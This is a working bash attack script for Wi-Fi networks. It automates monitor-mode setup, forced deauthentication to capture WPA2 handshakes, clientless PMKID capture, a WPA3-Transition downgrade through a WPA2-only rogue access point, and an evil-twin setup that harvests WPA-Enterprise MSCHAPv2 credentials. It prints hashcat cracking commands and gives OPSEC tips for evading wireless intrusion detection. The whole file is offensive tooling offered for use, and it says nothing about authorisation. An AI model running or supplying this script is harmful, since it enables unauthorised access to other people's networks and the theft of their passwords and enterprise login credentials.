#!/usr/bin/env bash
# wifi_attack.sh - WPA2/WPA3 wireless attack driver: monitor-mode setup,
# WPA2 handshake/PMKID capture, WPA3-Transition downgrade (Dragonblood),
# evil-twin / WPA-Enterprise credential capture.
#
# USAGE:
#   sudo ./wifi_attack.sh mon-up   <wlan>
#   sudo ./wifi_attack.sh scan     <wlanmon>
#   sudo ./wifi_attack.sh wpa2     <wlanmon> <bssid> <channel> [out_prefix]
#   sudo ./wifi_attack.sh pmkid    <wlan>                       # clientless
#   sudo ./wifi_attack.sh wpa3dg   <wlan> <wlanmon> <ssid> <channel>  # transition downgrade
#   sudo ./wifi_attack.sh eviltwin <wlan> <ssid> <channel>      # WPA-Ent cred capture
#
# DEPENDENCIES: aircrack-ng suite, hcxdumptool/hcxpcapngtool (PMKID),
#   hostapd-wpe OR eaphammer (evil twin / 802.1X), hashcat (cracking).
#   WPA3 downgrade: a WPA2-only rogue AP on the same SSID (hostapd) + deauth.
#
# OPSEC: deauth (mgmt frames) is detectable by WIDS (e.g. Kismet, vendor WIPS)
#   and blocked by 802.11w (MFP) on WPA3. Rogue APs raise "SSID seen on rogue
#   BSSID" alerts. Keep deauth bursts short and targeted at one client.

set -euo pipefail
MODE="${1:?mode required}"; shift || true

mon_up() {
    local W="${1:?wlan required}"
    airmon-ng check kill
    airmon-ng start "$W"
    echo "[+] monitor iface likely '${W}mon' (or 'mon0'); run: iwconfig"
}

scan() {
    local M="${1:?wlanmon required}"
    echo "[*] Scanning. Note RSN/AKM: 'SAE'=WPA3, 'PSK'=WPA2, both=Transition(vuln)."
    airodump-ng "$M"
}

wpa2() {
    local M="${1:?}" B="${2:?bssid}" C="${3:?channel}" OUT="${4:-capture}"
    echo "[*] Capturing 4-way handshake for $B on ch $C -> ${OUT}-01.cap"
    ( airodump-ng "$M" --bssid "$B" -c "$C" -w "$OUT" ) &
    DUMP=$!
    sleep 5
    echo "[*] Sending targeted deauth to force a handshake (5 bursts)"
    aireplay-ng -0 5 -a "$B" "$M" || true
    echo "[*] Capturing ~30s; Ctrl-C airodump when 'WPA handshake' appears."
    sleep 30; kill $DUMP 2>/dev/null || true
    echo "[*] Convert + crack:"
    echo "    hcxpcapngtool -o ${OUT}.hc22000 ${OUT}-01.cap"
    echo "    hashcat -m 22000 ${OUT}.hc22000 /usr/share/wordlists/rockyou.txt"
}

pmkid() {
    local W="${1:?wlan required}"
    echo "[*] Clientless PMKID capture (no deauth needed) via hcxdumptool"
    echo "    hcxdumptool -i $W -o pmkid.pcapng --enable_status=1"
    echo "    hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng"
    echo "    hashcat -m 22000 pmkid.hc22000 wordlist.txt"
    command -v hcxdumptool >/dev/null && hcxdumptool -i "$W" -o pmkid.pcapng --enable_status=1
}

wpa3dg() {
    # WPA3-Transition downgrade (Dragonblood). Stand up a WPA2-ONLY rogue AP on
    # the victim SSID; WPA3 clients that fall back to WPA2 leak a crackable
    # 4-way handshake. Tools: DragonShift (dragon.py) or eaphammer automate this.
    local W="${1:?managed wlan}" M="${2:?monitor wlan}" S="${3:?ssid}" C="${4:?channel}"
    local CONF; CONF="$(mktemp --suffix=.conf)"
    cat > "$CONF" <<EOF
interface=$W
driver=nl80211
ssid=$S
hw_mode=g
channel=$C
# WPA2-ONLY rogue AP: forces transition-mode clients to downgrade (no SAE/MFP)
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=downgradecapture
ieee80211w=0
EOF
    echo "[*] Rogue WPA2-only AP for SSID='$S' ch=$C (transition downgrade)"
    echo "    Config: $CONF"
    echo "    1) capture on monitor: airodump-ng $M --essid '$S' -w wpa3dg"
    echo "    2) deauth a real client off the legit WPA3 AP to trigger fallback"
    echo "    3) crack captured WPA2 handshake: hashcat -m 22000 wpa3dg.hc22000 wl.txt"
    echo "    (Or fully automated: python3 dragon.py / eaphammer --negotiate balanced)"
    hostapd "$CONF"
}

eviltwin() {
    # WPA-Enterprise (802.1X) credential capture: rogue RADIUS captures the
    # MSCHAPv2 challenge/response -> crack to plaintext or NT hash.
    local W="${1:?}" S="${2:?ssid}" C="${3:?channel}"
    echo "[*] Evil-twin WPA-Enterprise cred capture for SSID='$S'"
    if command -v eaphammer >/dev/null; then
        eaphammer --cert-wizard >/dev/null 2>&1 || true
        eaphammer -i "$W" --essid "$S" --channel "$C" --auth wpa-eap \
                  --creds --negotiate balanced
    else
        echo "    hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf"
        echo "    # then crack MSCHAPv2: asleap -C <challenge> -R <response> -W wordlist"
        echo "    # or hashcat -m 5500 captured.hash wordlist.txt"
        echo "[!] eaphammer not installed; using hostapd-wpe guidance above."
    fi
}

case "$MODE" in
  mon-up)   mon_up "$@";;
  scan)     scan "$@";;
  wpa2)     wpa2 "$@";;
  pmkid)    pmkid "$@";;
  wpa3dg)   wpa3dg "$@";;
  eviltwin) eviltwin "$@";;
  *) echo "[!] unknown mode: $MODE"; exit 1;;
esac
